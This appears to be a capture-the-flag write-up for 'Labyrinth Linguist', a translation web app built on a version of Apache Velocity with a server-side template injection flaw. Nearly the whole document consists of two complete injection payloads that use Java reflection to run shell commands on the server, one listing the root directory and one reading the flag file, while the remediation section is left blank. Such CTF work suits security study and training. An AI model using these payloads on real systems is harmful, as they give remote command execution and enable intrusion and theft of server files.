Labyrinth Linguist is a web Application that turns user input into another language. However, it runs on a version of Apache Velocity, which has a known SSTI vulnerability. 

## Solution
### Directory listing

```
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('ls -la /'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))$str.valueOf($chr.toChars($out.read()))#end
```

### Reading the flag
```
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('cat /flag.txt'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))$str.valueOf($chr.toChars($out.read()))#end
```
## Remediation
1. 

<img width="1218" height="979" alt="listing" src="https://github.com/user-attachments/assets/df1b144f-b1a0-4e78-8853-bb9101011d2e" />
<img width="1238" height="1007" alt="flag1" src="https://github.com/user-attachments/assets/40171701-1b0a-4d07-a16e-fb1a56bf266d" />
